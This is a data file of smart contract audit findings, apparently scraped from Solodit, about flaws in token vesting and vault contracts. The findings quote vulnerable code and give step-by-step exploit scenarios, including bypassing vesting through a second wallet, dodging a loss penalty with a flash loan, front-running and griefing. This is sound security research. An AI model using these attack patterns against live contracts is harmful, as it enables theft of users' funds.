Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,solodit_reports,31f8d0b116e197b941fe282dda224aa0,2023-09-22 02:45:51,2024-10-14 23:53:49,1,,
734374,67ee86adf71c0ee297f7f302bbd390f1,THE ONE YEAR VESTING PERIOD FOR ESLODE TOKENS CAN BE BYPASSED,Halborn,2023-07-28,"Commit IDs affected: -a21ecb23a4308c2602ac63ee86d576f78d73c6e6 Description: In the StakingRewards contract, the function convertEsLODEToLODE ()is used to convert vested esLODE to LODE. The vesting period of the esLODE tokens is 365 days: Listing 5: StakingRewards.sol (Line 252)239 /** 240 *@notice Converts vested esLODE toLODE and updates user reward ëshares accordingly accounting for current lock time and relocks 241 *@param user The staker 'saddress 242 */ 243 function convertEsLODEToLODE (address user )public returns (uint256 ë) { 244 //since this isalso called onunstake and harvesting ,weexit ë out ofthis function ifuser has noesLODE staked . 245 if(stakers [msg.sender ].totalEsLODEStakedByUser == 0) { 246 return 0; 247 } 248 249 uint256 lockTime =stakers [user ].lockTime ; 250 uint256 threeMonthCount =stakers [user ].threeMonthRelockCount ; 251 uint256 sixMonthCount =stakers [user ].sixMonthRelockCount ; 252 uint256 totalDays = 365 days ; 253 uint256 amountToTransfer ; 254 uint256 stLODEAdjustment ; 255 uint256 conversionAmount ; 256 257 Stake []memory userStakes =esLODEStakes [msg.sender ]; 258 259 for (uint256 i= 0; i<userStakes .length ;i++) { 34 FINDINGS & TECH DETAILS 260 uint256 timeDiff = (block .timestamp -userStakes [i]. ëstartTimestamp ); 261 uint256 alreadyConverted =userStakes [i].alreadyConverted ; 262 263 if(timeDiff >=totalDays ) { 264 conversionAmount =userStakes [i].amount ; 265 amountToTransfer +=conversionAmount ; 266 userStakes [i].amount = 0; 267 if(lockTime == 90 days ) { 268 stLODEAdjustment += 269 (conversionAmount * 270 ((stLODE3M - 1e18) + 271 (threeMonthCount *relockStLODE3M ) + 272 (sixMonthCount *relockStLODE6M ))) / 273 BASE ; 274 }else if(lockTime == 180 days ) { 275 stLODEAdjustment += 276 (conversionAmount * 277 ((stLODE6M - 1e18) + 278 (threeMonthCount *relockStLODE3M ) + 279 (sixMonthCount *relockStLODE6M ))) / 280 BASE ; 281 } 282 }else if(timeDiff <totalDays ) { 283 uint256 conversionRatioMantissa = (timeDiff *BASE ) / ëtotalDays ; 284 conversionAmount = (( userStakes [i].amount * ëconversionRatioMantissa ) / BASE ) - alreadyConverted ; 285 amountToTransfer +=conversionAmount ; 286 esLODEStakes [msg.sender ][i].alreadyConverted += ëconversionAmount ; 287 esLODEStakes [msg.sender ][i].amount -=conversionAmount ë; 288 if(lockTime == 90 days ) { 289 stLODEAdjustment += 290 (conversionAmount * 291 ((stLODE3M - 1e18) + 292 (threeMonthCount *relockStLODE3M ) + 293 (sixMonthCount *relockStLODE6M ))) / 294 BASE ; 295 }else if(lockTime == 180 days ) { 296 stLODEAdjustment += 297 (conversionAmount * 298 ((stLODE6M - 1e18) + 35 FINDINGS & TECH DETAILS 299 (threeMonthCount *relockStLODE3M ) + 300 (sixMonthCount *relockStLODE6M ))) / 301 BASE ; 302 } 303 } 304 } 305 306 stakers [user ].lodeAmount +=amountToTransfer ; 307 stakers [user ].totalEsLODEStakedByUser -=amountToTransfer ; 308 totalEsLODEStaked -=amountToTransfer ; 309 310 if(stLODEAdjustment != 0) { 311 stakers [user ].stLODEAmount +=stLODEAdjustment ; 312 UserInfo storage userRewards =userInfo [user ]; 313 314 uint256 _prev =totalSupply (); 315 316 updateShares (); 317 318 unchecked { 319 userRewards .amount +=uint96 (stLODEAdjustment ); 320 shares +=uint96 (stLODEAdjustment ); 321 } 322 323 userRewards .wethRewardsDebt = 324 userRewards .wethRewardsDebt + 325 int128 (uint128 (_calculateRewardDebt (accWethPerShare , ëuint96 (stLODEAdjustment )))); 326 327 _mint (address (this ),stLODEAdjustment ); 328 329 unchecked { 330 if(_prev +stLODEAdjustment !=totalSupply ()) revert ëDEPOSIT_ERROR (); 331 } 332 } 333 334 esLODE .transfer (address (0) , amountToTransfer ); 335 return conversionAmount ; 336 } The convertEsLODEToLODE (address user )function has a user parameter that when used with an account different from msg.sender causes the following 36 FINDINGS & TECH DETAILS exploit: 1.User1 stakes 1000e18 esLODE and waits 365 days. User1’s esLODE tokens are vested at this point. 2.User1 creates another wallet, let’s call this wallet User2. 3.User2 stakes 1000e18 esLODE tokens. 4.User1 calls convertEsLODEToLODE (<user2 address >). 5.User2 esLODE tokens are converted right away to LODE 6.Repeat this process with other wallets to totally bypass the vesting period. 37 FINDINGS & TECH DETAILS BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:N/Y:N/R:N/S:C (10) Recommendation: It is recommended to remove the user parameter from the convertEsLODEToLODE () function and perform all the function logic using msg.sender .",Lodestar Finance - Staking  Security Assessment,Halborn,HIGH,,,35,0,0,,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/halborn/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,solodit_reports,8882acad9f61cd2adcb2664d72308196,2023-09-22 02:46:15,2024-10-15 00:06:31,1,,
759207,9661bf9365260fb71384f19bd82b9e49,All vesting grants are revocable,OpenZeppelin,2017-09-11,"It should be noted that all vesting grants are [revocable](https://github.com/kikinteractive/kin-token/blob/3ed3a383b9304274ec22f41769716cadb854727f/contracts/KinTokenSale.sol#L285-L286) (indicated by the last parameter, `true`), including the large grant given to Kik. If a grant is revoked, all of its vesting tokens are immediately transferred to the owner of `VestingTrustee`. Make sure that this is in fact desired.


***Update:** The team has clarified that this is a temporary measure so that possible errors can be fixed afterwards, and that all grants will be manually made irrevocable as soon as possible.*",Kin Token Audit,OpenZeppelin,HIGH,,,0,0,0,,https://blog.openzeppelin.com/kin-token-audit-121788c06fe/,,,solodit_reports,,2023-09-22 02:36:28,2024-10-14 21:01:00,1,"trustee.grant(grantee, tokensVested, now.add(tokenGrant.startOffset), now.add(tokenGrant.cliffOffset),
                    now.add(tokenGrant.endOffset), tokenGrant.installmentLength, true);",Dexes|CDP|Services|Cross Chain|Launchpad
759228,710bb15dc6cd0de742316473d2352aad,Revoking a vesting grant takes vested tokens away,OpenZeppelin,2017-09-11,"The [`revoke`](https://github.com/kikinteractive/kin-token/blob/3ed3a383b9304274ec22f41769716cadb854727f/contracts/VestingTrustee.sol#L90) function in `VestingTrustee` allows the owner to revoke an address’s vesting grant, in the case that it is revocable. This consists of erasing the grant and transferring the remaining tokens to the owner. The function considers “remaining tokens” to be all those that haven’t been [unlocked and transferred](https://github.com/kikinteractive/kin-token/blob/3ed3a383b9304274ec22f41769716cadb854727f/contracts/VestingTrustee.sol#L151) yet. However, it is likely that remaining tokens should be considered to be only those which have not yet vested, regardless of whether they’ve been transferred or not. Consider changing `revoke` to first transfer vested tokens to the grantee, and only the remaining as a refund to the owner.


***Update:** The team assured us that, although they have not implemented our suggested change, the risk is mitigated by the fact that all vesting grants will be made irrevocable as soon as possible after the sale and that revocation will be only possible by getting access to the multisig owner of the contract. There is no risk for an irrevocable grant, so there would be no problem for investors after made irrevocable.*",Kin Token Audit,OpenZeppelin,HIGH,,,0,0,0,,https://blog.openzeppelin.com/kin-token-audit-121788c06fe/,,,solodit_reports,,2023-09-22 02:36:28,2024-10-14 21:01:51,1,"function revoke(address _holder) public onlyOwner {
```
    function unlockVestedTokens() external {",Dexes|CDP|Services|Cross Chain|Launchpad
759286,897f13d3344d793304f4e440b78ab205,Migration bypasses vesting restrictions,OpenZeppelin,2017-12-19,"All of the users are allowed to [`migrate`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L109) their tokens to a new contract regardless of whether their assets are fully transferable or locked in a vesting scheme. Moreover, once they migrate the tokens any vesting restrictions are removed.


We recommend only allowing `transferableTokens` to be available for migrations. An alternative solution is to implement a new `migateVestedTokens` function that will copy the vesting configuration to the migration target contract.


***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit by [checking](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/QiibeeToken.sol#L120) if the amount of tokens is within the `transferableTokens` limit at the moment of migration.*",Qiibee Token Audit,OpenZeppelin,HIGH,,,0,0,0,,https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/,,,solodit_reports,,2023-09-22 02:36:32,2024-10-14 21:02:58,1,function migrate(uint256 _value) public whenNotPaused {,Dexes|Services|Indexes|Leveraged Farming|Payments
761045,641e026018cafe22c12791dd5e41f895,Strategy owner can reduce or bypass loss penalty,TrailOfBits,2021-04-30,"Type:   Data   Validation
Target:    Vault.vy

Diﬃculty:   High
Description
The   vaults   penalize   strategies   that   report   losses,   but   a   strategy   owner   can   reduce   or   bypass
a   penalty   using   a   ﬂash   loan.
The   strategy   owner   should   call    report    on   his   or   her   strategies,   which   will   then   call   the
report   function   in   the   vault   specifying   gains   and   losses:
@external
def   report(gain:   uint256,   loss:   uint256,   _debtPayment:   uint256)   ->   uint256:
...
#   Only   approved   strategies   can   call   this   function
assert   self.strategies[msg.sender].activation   >   0
#   No   lying   about   total   available   to   withdraw!
assert   self.token.balanceOf(msg.sender)   >=   gain   +   _debtPayment
#   We   have   a   loss   to   report,   do   it   before   the   rest   of   the   calculations
if   loss   >   0:
self._reportLoss(msg.sender,   loss)
...
Figure   7.1:   The   header   of   the    report    function   in   the   vault
If   a   strategy   reports   losses,   its   debt   ratio   should   be   reduced.   The   following   formula
calculates   the   amount   of   that   reduction:
@internal
def   _reportLoss(strategy:   address,   loss:   uint256):
#   Loss   can   only   be   up   the   amount   of   debt   issued   to   strategy
totalDebt:   uint256   =   self.strategies[strategy].totalDebt
assert   totalDebt   >=   loss
self.strategies[strategy].totalLoss   +=   loss
self.strategies[strategy].totalDebt   =   totalDebt   -   loss
self.totalDebt   -=   loss
#   Also,   make   sure   we   reduce   our   trust   with   the   strategy   by   the   same   amount
debtRatio:   uint256   =   self.strategies[strategy].debtRatio
precisionFactor:   uint256   =   self.precisionFactor
ratio_change:   uint256   =   min(precisionFactor   *   loss   *   MAX_BPS   /   self._totalAssets()   /
precisionFactor,   debtRatio)
self.strategies[strategy].debtRatio   -=   ratio_change
self.debtRatio   -=   ratio_change
Figure   7.2:   The    _reportLoss    function
The   computation   of   the   debt   ratio   change   depends   on   the   total   asset   amount,   which   is
calculated   using   the   balance   of   the   vault.   However,   a   strategy   owner   can   temporarily
increase   this   value   by   making   a   series   of   calls   to   do   the   following   in   a   single   transaction:
©   2021   Trail   of   Bits
Yearn   v2   Vaults   Assessment   |   28
1. Take   out   a   ﬂash   loan
2. Make   a   deposit
3. Call    report
4. Make   a   withdrawal
5. Repay   the   ﬂash   loan
Since   the   value   of    _totalAssets()    will   increase   (without   exceeding   the   deposit   limit),   the
ratio_change    amount   can   be   reduced,   even   to   zero,   allowing   the   user   to   avoid   the   debt
change.
Exploit   Scenario
Alice   is   a   user   interested   in   investing   in   a   vault.   Eve   owns   a   strategy   in   that   vault.   An   audit   of
Eve’s   strategy   ﬁnds   that   it   works   as   expected,   but   it   is   very   risky.   Eve   calls    report    to   disclose
her   losses   but   uses   a   ﬂash   loan   to   exploit   the    reportLoss    function,   avoiding   the   debt
penalty.
Alice   checks   the   debt   ratio   of   Eve's   strategy   and   ﬁnds   it   satisfactory.   She   decides   to   buy
shares,   but   because   Eve   manipulated   the   debt   ratio,   she   underestimates   the   risk.
Recommendations
Short   term,   revise   the   penalty   computation   to   avoid   using    _totalAssets() ,   which   depends
on   the   balance   of   the   vault.
Long   term,   review   the   speciﬁcation   on   incentives   and   penalties   to   make   sure   that   they   do
not   depend   on   variables   that   can   be   manipulated   by   users.   Use   Echidna   or   Manticore   to
test   them.
©   2021   Trail   of   Bits
Yearn   v2   Vaults   Assessment   |   29",Yearn v2 Vaults,Gustavo Grieco|Mike Martel,HIGH,,,29,0,0,,https://github.com/trailofbits/publications/blob/master/reviews/YearnV2Vaults.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/trailofbits/YearnV2Vaults.pdf,https://github.com/trailofbits/publications/blob/master/reviews/YearnV2Vaults.pdf,solodit_reports,fef89bda1f0b932f97b6371056a976fb,2023-09-22 02:38:17,2024-10-14 21:48:55,1,,
761593,2ed771dd8d5dbc2725c62895e99690fd,WRONG CONSTANT USED IN EMISSIONSSPLITTER.SOL,Halborn,2021-08-25,"Description: The contract EmissionsSplitter receives XRUNE token emissions and then calls the run()function to split up its current balance between the private investors, teams, DAO and ecosystem contracts/addresses following their respective vesting curves. These are the vesting curves: As we can see, for the teams there is a total of 110,000,000 tokens. In the contract, we can see defined that in the first half (2 years) 66,000,000 of these tokens will be given, and then, on the second half, the rest (44,000,000 tokens): 15FINDINGS & TECH DETAILS Listing 1: EmissionsSplitter.sol (Lines 24,25) 21 uint public constant ONE_YEAR = 31536000; 22 uint public constant INVESTORS_EMISSIONS_HALF1 = 45000000 e18; 23 uint public constant INVESTORS_EMISSIONS_HALF2 = 30000000 e18; 24 uint public constant TEAM_EMISSIONS_HALF1 = 66000000 e18; 25 uint public constant TEAM_EMISSIONS_HALF2 = 44000000 e18; 26 uint public constant ECOSYSTEM_EMISSIONS = 250000000 e18; In the function run()we can see that the constant TEAM_EMISSIONS_HALF1 is being used incorrectly instead of TEAM_EMISSIONS_HALF2 . Code Location: Listing 2: EmissionsSplitter.sol (Lines 103,107) 89uint sentToTeamNow = 0; 90{ 91 //Team get 66Mtokens linearly over the first 2years 92 uint teamProgress =_min (((block .timestamp -emissionsStart ) * 1e12) / (2 * ONE_YEAR ), 1 e12); 93 uint teamUnlocked = (teamProgress *TEAM_EMISSIONS_HALF1 ) / 1 e12; 94 uint teamAmount =_min (teamUnlocked -sentToTeam ,amount ); 95 if(teamAmount > 0) { 96 sentToTeamNow +=teamAmount ; 97 sentToTeam +=teamAmount ; 98 amount -=teamAmount ; 99 token .safeTransfer (team ,teamAmount ); 100 } 101 } 102 { 103 //Team get their remaining 44Mtokens linearly over the next 2years 104 uint elapsed =block .timestamp -emissionsStart ; 105 elapsed -=_min (elapsed , 2 * ONE_YEAR ); 106 uint teamProgress =_min ((elapsed * 1e12) / (2 * ONE_YEAR ), 1 e12); 107 uint teamUnlocked = (teamProgress *TEAM_EMISSIONS_HALF1 ) / 1 e12; 108 uint teamAmount =_min (teamUnlocked -_min (teamUnlocked , sentToTeam ),amount ); 16FINDINGS & TECH DETAILS 109 if(teamAmount > 0) { 110 sentToTeamNow +=teamAmount ; 111 sentToTeam +=teamAmount ; 112 amount -=teamAmount ; 113 token .safeTransfer (team ,teamAmount ); 114 } 115 } Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended to replace TEAM_EMISSIONS_HALF1 with TEAM_EMISSIONS_HALF2 constant in line 107 of EmissionsSplitter .sol.",THORSTARTER,Halborn,HIGH,,,16,4,5,,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity%20Smart%20Contract%20Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/halborn/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity%20Smart%20Contract%20Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf,solodit_reports,,2023-09-22 02:38:50,2024-10-14 21:52:39,1,,Dexes|CDP|Services|Yield Aggregator|Cross Chain
761913,d50f26425489ddf6a12c9dc6d09c2e94,[H-13] Tokens Can Be Stolen By Frontrunning VestedRewardPool.vest() and VestedRewardPool.lock(),Code4rena,2021-10-21,"# Handle

leastwood


# Vulnerability details

## Impact

The `VestedRewardPool.sol` contract is a public facing contract aimed at vesting tokens for a minimum of 90 days before allowing the recipient to withdraw their `mochi`. The `vest()` function does not utilise `safeTransferFrom()` to ensure that vested tokens are correctly allocated to the recipient. As a result, it is possible to frontrun a call to `vest()` and effectively steal a recipient's vested tokens. The same issue applies to the `lock()` function.

## Proof of Concept

https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/emission/VestedRewardPool.sol#L36-L46
https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/emission/VestedRewardPool.sol#L54-L64

## Tools Used

Manual code review
Discussions with the Mochi team

## Recommended Mitigation Steps

Ensure that users understand that this function should not be interacted directly as this could result in lost `mochi` tokens. Additionally, it might be worthwhile creating a single externally facing function which calls `safeTransferFrom()`, `vest()` and `lock()` in a single transaction.",Mochi,leastwood,HIGH,Front-Running,"$80,000 worth of ETH",0,0,0,https://github.com/code-423n4/2021-10-mochi-findings/issues/92,https://code4rena.com/reports/2021-10-mochi,,https://code4rena.com/contests/2021-10-mochi-contest,solodit_reports,7c69c283621032397ed1e748fed01ecb,2023-09-22 02:39:08,2024-10-14 21:56:35,1,,Dexes|CDP|Cross Chain|RWA|Options Vault
761996,a3843237f21c542190d92ee020eb3d65,[H-08] Unable to claim vesting due to unbounded timelock loop,Code4rena,2021-11-04,"# Handle

nathaniel


# Vulnerability details

## Impact
The timelocks for any *beneficiary* are unbounded, and can be vested by someone who is not the *beneficiary*. When the array becomes significantly big enough, the vestments will no longer be claimable for the *beneficiary*.

The `vest()` function in Vesting.sol does not check the *beneficiary*, hence anyone can vest for anyone else, pushing a new timelock to the `timelocks[_beneficiary]`.
The `_claimableAmount()` function (used by `claim()` function), then loops through the `timelocks[_beneficiary]` to determine the amount to be claimed.
A malicious actor can easy repeatedly call the `vest()` function with minute amounts to make the array large enough, such that when it comes to claiming, it will exceed the gas limit and revert, rendering the vestment for the beneficiary unclaimable. 
The malicious actor could do this to each *beneficiary*, locking up all the vestments.

## Proof of Concept
https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L81
https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L195
https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L148

## Tools Used
Manual code review

## Recommended Mitigation Steps
- Create a minimum on the vestment amounts, such that it won't be feasible for a malicious actor to create a large amount of vestments.
- Restrict the vestment contribution of a *beneficiary* where `require(beneficiary == msg.sender)`",Boot Finance,nathaniel|WatchPug|pauliax|leastwood,HIGH,,"$50,000 USDC",0,0,5,https://github.com/code-423n4/2021-11-bootfinance-findings/issues/120,https://code4rena.com/reports/2021-11-bootfinance,,https://code4rena.com/contests/2021-11-boot-finance-contest,solodit_reports,2a8bccf05d5199887f4818998bf88d01,2023-09-22 02:39:13,2024-10-14 21:57:43,1,,Dexes|CDP|Services|Privacy
761998,89676e4892bf6d8a00f577611c1ae104,[H-09] addInvestor() Does Not Check Availability of investors_supply,Code4rena,2021-11-04,"# Handle

Meta0xNull


# Vulnerability details

## Impact
When add investor, addInvestor() does not check how many tokens is available from investors_supply. The total tokens allocated for Investors could more than investors_supply.

Possible Attack Scenario:
1. Attacker who have Admin Private key call addInvestor() and Input _amount >= investors_supply.
2. Attacker can Claim All Available Tokens Now.

## Proof of Concept
https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/InvestorDistribution.sol#L85-L94

## Tools Used
Manual Review

## Recommended
1. Add require(_amount <= (investors_supply - Allocated_Amount))
2. When Add an Investor add the amount to Allocated_Amount with SafeMath",Boot Finance,Meta0xNull,HIGH,,"$50,000 USDC",0,0,0,https://github.com/code-423n4/2021-11-bootfinance-findings/issues/201,https://code4rena.com/reports/2021-11-bootfinance,,https://code4rena.com/contests/2021-11-boot-finance-contest,solodit_reports,2a8bccf05d5199887f4818998bf88d01,2023-09-22 02:39:13,2024-10-14 21:57:49,1,,Dexes|CDP|Services|Privacy
762018,7d7170b89a0faea7da53dfaeaf9129b4,"[H-01] Contract BasicSale is missing an approve(address(vestLock), 2**256-1) call",Code4rena,2021-11-04,"# Handle

Reigada


# Vulnerability details

## Impact
As we can see in the contracts AirdropDistribution and InvestorDistribution, they both have the following approve() call: mainToken.approve(address(vestLock), 2**256-1);
https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/AirdropDistribution.sol#L499
https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/InvestorDistribution.sol#L80

This is necessary because both contracts transfer tokens to the vesting contract by calling its vest() function:
https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/AirdropDistribution.sol#L544
https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/AirdropDistribution.sol#L569
https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/InvestorDistribution.sol#L134
https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/InvestorDistribution.sol#L158

The code of the vest() function in the Vesting contract performs a transfer from msg.sender to Vesting contract address -> vestingToken.transferFrom(msg.sender, address(this), _amount);
https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L95

Same is done in the BasicSale contract:
https://github.com/code-423n4/2021-11-bootfinance/blob/main/tge/contracts/PublicSale.sol#L225

The problem is that this contract is missing the approve() call. For that reason, the contract is totally useless as the function _withdrawShare() will always revert with the following message:
revert reason: ERC20: transfer amount exceeds allowance. This means that all the mainToken sent to the contract would be stuck there forever. No way to retrieve them.

How this issue was not detected in the testing phase?
Very simple. The mock used by the team has an empty vest() function that performs no transfer call.
https://github.com/code-423n4/2021-11-bootfinance/blob/main/tge/contracts/helper/MockVesting.sol#L10

## Proof of Concept
See below Brownie's custom output:
Calling -> publicsale.withdrawShare(1, 1, {'from': user2})
Transaction sent: 0x9976e4f48bd14f9be8e3e0f4d80fdb8f660afab96a7cbd64fa252510154e7fde
  Gas price: 0.0 gwei   Gas limit: 6721975   Nonce: 5
  BasicSale.withdrawShare confirmed (ERC20: transfer amount exceeds allowance)   Block: 13577532   Gas used: 323334 (4.81%)

Call trace for '0x9976e4f48bd14f9be8e3e0f4d80fdb8f660afab96a7cbd64fa252510154e7fde':
Initial call cost  [21344 gas]
BasicSale.withdrawShare  0:3724  [16114 / -193010 gas]
├── BasicSale._withdrawShare  111:1109  [8643 / 63957 gas]
│   ├── BasicSale._updateEmission  116:405  [53294 / 55739 gas]
│   │   └── BasicSale.getDayEmission  233:248  [2445 gas]
│   ├── BasicSale._processWithdrawal  437:993  [-7726 / -616 gas]
│   │   ├── BasicSale.getEmissionShare  484:859  [4956 / 6919 gas]
│   │   │   │
│   │   │   └── MockERC20.balanceOf  [STATICCALL]  616:738  [1963 gas]
│   │   │           ├── address: mockerc20.address
│   │   │           ├── input arguments:
│   │   │           │   └── account: publicsale.address
│   │   │           └── return value: 100000000000000000000
│   │   │
│   │   └── SafeMath.sub  924:984  [191 gas]
│   └── SafeMath.sub  1040:1100  [191 gas]
│
├── MockERC20.transfer  [CALL]  1269:1554  [1115 / 30109 gas]
│   │   ├── address: mockerc20.address
│   │   ├── value: 0
│   │   ├── input arguments:
│   │   │   ├── recipient: user2.address
│   │   │   └── amount: 27272727272727272727
│   │   └── return value: True
│   │
│   └── ERC20.transfer  1366:1534  [50 / 28994 gas]
│       └── ERC20._transfer  1374:1526  [28944 gas]
└── Vesting.vest  [CALL]  1705:3712  [-330491 / -303190 gas]
    │   ├── address: vesting.address
    │   ├── value: 0
    │   ├── input arguments:
    │   │   ├── _beneficiary: user2.address
    │   │   ├── _amount: 63636363636363636363
    │   │   └── _isRevocable: 0
    │   └── revert reason: ERC20: transfer amount exceeds allowance <-------------
    │
    ├── SafeMath.add  1855:1883  [94 gas]
    ├── SafeMath.add  3182:3210  [94 gas]
    ├── SafeMath.add  3236:3264  [94 gas]
    │
    └── MockERC20.transferFrom  [CALL]  3341:3700  [99923 / 27019 gas]
        │   ├── address: mockerc20.address
        │   ├── value: 0
        │   ├── input arguments:
        │   │   ├── sender: publicsale.address
        │   │   ├── recipient: vesting.address
        │   │   └── amount: 63636363636363636363
        │   └── revert reason: ERC20: transfer amount exceeds allowance
        │
        └── ERC20.transferFrom  3465:3700  [-97648 / -72904 gas]
            └── ERC20._transfer  3473:3625  [24744 gas]

## Tools Used
Manual testing

## Recommended Mitigation Steps
The following approve() call should be added in the constructor of the BasicSale contract:
mainToken.approve(address(vestLock), 2**256-1);",Boot Finance,Reigada|WatchPug,HIGH,,"$50,000 USDC",0,0,0,https://github.com/code-423n4/2021-11-bootfinance-findings/issues/135,https://code4rena.com/reports/2021-11-bootfinance,,https://code4rena.com/contests/2021-11-boot-finance-contest,solodit_reports,2a8bccf05d5199887f4818998bf88d01,2023-09-22 02:39:14,2024-10-14 21:57:43,1,,Dexes|CDP|Services|Privacy
762070,add87fc47e7f921df78d195e690072e6,[H-01] Anyone Can Arbitrarily Call FSDVesting.updateVestedTokens(),Code4rena,2021-11-09,"# Handle

leastwood


# Vulnerability details

## Impact

The `updateVestedTokens()` function is intended to be called by the `FSD.sol` contract when updating a user's vested token amount. A check is performed to ensure that `_user == beneficiary`, however, as `_user` is a user controlled argument, it is possible to spoof calls to `updateVestedTokens()` such that anyone can arbitrarily add any amount to the vested contract. Additionally, there is no check to ensure that the call originated from a trusted/whitelisted source.

There are two main reasons as to why the beneficiary or an attacker would want to call this function:
- To increase the vested amount such that `calculateVestingClaim()` allows them to withdraw their entire vested amount without waiting the entire duration.
- An attacker wishes to block withdrawals from other vested contracts by preventing successful calls to `claimVestedTokens()` by the beneficiary account. This can be done by increasing the vested amount such that `safeTransfer()` calls fail due to insufficient token balance within the contract.

## Proof of Concept

https://github.com/code-423n4/2021-11-fairside/blob/main/contracts/token/FSDVesting.sol#L147-L161
https://github.com/code-423n4/2021-11-fairside/blob/main/contracts/token/FSDVesting.sol#L100-L115
https://github.com/code-423n4/2021-11-fairside/blob/main/contracts/token/FSDVesting.sol#L125
https://github.com/code-423n4/2021-11-fairside/blob/main/contracts/token/FSDVesting.sol#L134

## Tools Used

Manual code review.
Discussions with dev.

## Recommended Mitigation Steps

Ensure that the `updateVestedTokens()` function is only callable from the `FSD.sol` contract. This can be done by implementing an `onlyFSD` role.",FairSide,hickuphh3|WatchPug|rfa|leastwood|cmichel|hyh,HIGH,Access Control,"$30,000 worth of ETH",0,4,3,https://github.com/code-423n4/2021-11-fairside-findings/issues/101,https://code4rena.com/reports/2021-11-fairside,,https://code4rena.com/contests/2021-11-fairside-contest,solodit_reports,ae5f5500f15d19207880636eaaf3ab32,2023-09-22 02:39:17,2024-10-14 21:58:33,1,,Dexes|CDP|Services|Cross Chain|Liquidity manager
762134,e3f56de89644b0920abf67415bf61ccc,INVALID CHECK ON CREATECLAIM METHOD LEADS TO UNCLAIM OF TOKENS,Halborn,2021-11-23,"Description: The createClaim method on the contract which ables to create claim for beneficiary users is vulnerable to division by zero vulnerability due to invalid check. This method takes several arguments such as _beneficiary , _vestAmount ,_unlockAmount ,_unlockTime ,_startTime and _endTime . Also, this method has several require controls itself. The following require check makes it possible to enter 0as the _endTime variable if _startTime variable equals to 0. Listing 1: BicoVestingFlat.sol 1require (_endTime >=_startTime ,""INVALID_TIME ""); Setting 0as both _startTime and _endTime variables will work properly. However, the claimableAmount method will not work since division by zero occur due to_endTime variable equals to 0. Therefore, it will not be possible to claim tokens for beneficiary. As a result, tokens will be stuck on the contract even claims [beneficiary ].isActive equals to true . Code Location: Listing 2: BicoVestingFlat.sol (Lines 1156) 1147 function createClaim ( 1148 address _beneficiary , 1149 uint256 _vestAmount , 1150 uint256 _unlockAmount , 1151 uint256 _unlockTime , 1152 uint64 _startTime , 14FINDINGS & TECH DETAILS 1153 uint64 _endTime 1154 )public onlyAdmin { 1155 require (!claims [_beneficiary ].isActive ,""CLAIM_ACTIVE ""); 1156 require (_endTime >=_startTime ,""INVALID_TIME ""); 1157 require (_beneficiary !=address (0) , ""INVALID_ADDRESS ""); 1158 require (_vestAmount > 0, ""INVALID_AMOUNT ""); 1159 //review 1160 //should probably use IERC20 interface instead ofERC20 import ? 1161 //need for safe transfer ? 1162 1163 //notice 1164 //Admin needs togive prior apporve tokens tothis contract 1165 require ( 1166 ERC20 (tokenAddress ).allowance (msg.sender ,address (this )) >= 1167 (_vestAmount .add(_unlockAmount )), 1168 ""INVALID_ALLOWANCE "" 1169 ); 1170 ERC20 (tokenAddress ).transferFrom ( 1171 msg.sender , 1172 address (this ), 1173 _vestAmount 1174 ); 1175 Claim memory newClaim =Claim ({ 1176 isActive :true , 1177 vestAmount :_vestAmount , 1178 unlockAmount :_unlockAmount , 1179 unlockTime :_unlockTime , 1180 startTime :_startTime , 1181 endTime :_endTime , 1182 amountClaimed : 0 1183 }); 1184 claims [_beneficiary ] = newClaim ; 1185 emit ClaimCreated ( 1186 msg.sender , 1187 _beneficiary , 1188 _vestAmount , 1189 _unlockAmount , 1190 _unlockTime , 1191 _startTime , 1192 _endTime 1193 ); 15FINDINGS & TECH DETAILS 1194 } Listing 3: BicoVestingFlat.sol (Lines 1255,1256) 1254 { 1255 claimPercent =currentTimestamp .sub(_claim .startTime ).mul (1e18).div( 1256 _claim .endTime .sub(_claim .startTime ) 1257 ); 1258 claimAmount =_claim .vestAmount .mul(claimPercent ).div(1e18 ).add( 1259 _claim .unlockAmount 1260 ); 1261 unclaimedAmount =claimAmount .sub(_claim .amountClaimed ); 1262 } Risk Level: Likelihood - 4 Impact - 4 Recommendations: It is recommended to replace the require check above with the following one. Also, it is 